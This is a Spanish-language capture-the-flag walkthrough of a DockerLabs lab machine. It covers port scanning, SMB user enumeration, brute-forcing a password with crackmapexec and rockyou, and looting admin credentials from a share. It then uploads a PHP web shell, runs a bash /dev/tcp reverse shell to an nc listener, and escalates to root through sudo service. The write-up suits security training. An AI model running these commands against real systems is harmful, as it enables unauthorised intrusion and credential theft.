Para iniciar inicimos el tres floder con el el `mkdir scaning explits others` 

 *  **scaning**: Teine los escaneos que hacemos sobre la maquina como nmap, etc.
 * **exploit**: contiene todos los exploits and vulnerabilidades que encontremos de los servicios que tenemos.
 * **Others**: todo los demas tanto ecuciones and info de la machinas.

con el `unzip`  descomprimimos el archivo del allien.zip  para desplegara la maquina de Dockerlabs.

![[Pasted image 20241013174516.png]]

`sudo bash auto_deploy.sh allien.tar` --->  lanzamos la maquiana de dokerlabs.

![[Pasted image 20241013174947.png]]


#### Enumeracion.
usando nmap resaizamos un scaneo y lista de servicios con que encientran en la maquina.
`sudo nmap -p- --open -sS -sCV --min-rate 5000 -n -Pn -vvv 172.17.0.2 -oN scaning.txt`

![[Pasted image 20241013175550.png]]

Observamos los servicios 

| servico | Puerto | version                          |
| ------- | ------ | -------------------------------- |
| ssh     | 22     | OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 |
| HTTP    | 80     | Apache httpd 2.4.58              |
| smb     | 445    | smbd 4.6.2                       |
El primer puerto que enemumerarimos es el 80, por  lo que nos dirigimos al navegador web.

![[Pasted image 20241013182032.png]]

vemos una sitio web  donde hay que inicar sesion asi que veamos que tecnologias tiene atras.

el **wappalyzer** no reporta mucha cosa incluso los que ya ha reportado el **nmap** asi paso hacer fuzzing web.

`wfuzz -c -t 200 --hc=404,500 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://172.17.0.2/FUZZ.php`

`gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium -x php`
implementado **wfuzz** o **gobuster** con la expencion de php para ver que encontramos tenmos diferentes rutas.

![[Pasted image 20241015092925.png]]

ok vemos info.php y vemos que son la el archivo de infomacion de php y la otro es la paguina de poductos en la cual no hay mucho que hacer. 

ya que por el puerto 80 no enctramos nado eneumeraremos ahora el puerto 139,445 smb  samba

ok empecemos por smbmap sin usaurio y contraseña pero no obtnemos nada asi que usaremos `rpcclient`

`rpcclient -U "" -N 172.17.0.2` con el comado enumdomusers podemos listar usaurios del sistema y teniemos mucho

![[Pasted image 20241015100722.png]]

vemos tenome varios usurios entre ellos administrator este no tenemos aceso y otro llamdo satriani7 ok usando crackmapexec haremios un ataque para para obtener aceso de la siguiente manera  

`crackmapexec smb 172.17.0.2 -u 'satriani7' -p /usr/share/wordlists/rockyou.txt`

![[Pasted image 20241015101546.png]]

bingo tenemos un exito el usurio  tinene  el password `50cent`


`smbmap -H 172.17.0.2 -u "satriani7" -p "50cent"`

![[Pasted image 20241015102449.png]]
 vale ahora smbmap  y tenemos varios archivos **READ ONLY** myshare, backup24. vallamos a ver backup usando **smbclient**

`smbclient //172.17.0.2/backup24 -U 'satriani7%50cent'`

![[Pasted image 20241015103901.png]]
![[Pasted image 20241015104015.png]]

usando los camdo dir y  mget descargamos los dos documento que vemos uno llamdo *credentials.txt* y *notes.tx* asi que vemos que podemos hacer

al obtener cada una de estos usando `mget *` .  abriendo en nuestra maquina el archivo **credentials.txt** vemos la credenciales de administrador.

![[Pasted image 20241016145200.png]]

tenemos la credecial de administrator por lo que podimos usando crackmapexec ver que podemos hacer.

`crackmapexec smb 172.17.0.2 -u 'administrador' -p 'Adm1nP4ss2024' --shares`

![[Pasted image 20241016145850.png]]
vemos que el usuario administador  tiene premiso de lectura y escritura en el la carpeta de home y quemarca que es poduccion vemos que es lo que obtenemos

usando `smbmap -H 172.17.0.2 -u "administrador" -p "Adm1nP4ss2024" -r home` 
![[Pasted image 20241016150740.png]]

vemos una lista de archivos muy parecido a los encontrados al aver listado la rutas del navegador asi que podiamos probrar subiendo un pwned.php y ver que tal y que podemos encontrar.
![[Pasted image 20241016151156.png]]
subiendo esta codigo podemos ver si podemos ejecutar comando en el sistema.

para susbie el archivo usamos de nuebo smbcliente pero estaves con la credenciales del usario administrador.

`smbclient //172.17.0.2/home -U 'administrador%Adm1nP4ss2024'`

![[Pasted image 20241016151822.png]]

y usando el metodo put en smbclient podemos subur el archivo 

ahor si nos dirigimos al buscador podemos ver si ese encuntrae en la lista de direcctorios

![[Pasted image 20241016152037.png]]

ok lo emos conseguido ahora solo restar crear un reveshell para obtener una shell en de la maquina victima.

en este caso creamo una reveshell ayudados de [Online - Reverse Shell Generator (revshells.com)](https://www.revshells.com/)

escribiemo y ejecutamos en el navegador 

`bash -c "sh -i >& /dev/tcp/172.17.0.1/443 0>&1"`

y en nustra maquina atacante 

`nc -nlvp 443`


![[Pasted image 20241016153310.png]]
 bien hecho ya tenemos acesos a la maquiana ahora solo resta trata la tty y escaclar privilejios

 
#### Private Esacalate
luego de tratar la tty  lo primero que hacemos es ejecutar un `sudo -l`

![[Pasted image 20241016164447.png]]

vemos que como cualquier usario podemos ejecitar el services busando en GTFBIN 
![[Pasted image 20241016164754.png]]

encontramos que pidemos escalar privilejios usando
`sudo /usr/sbin/service ../../bin/bash`

asi que ejecutamos y obetenemos asi un bash como root
![[Pasted image 20241016165010.png]]


###### by Juandas13
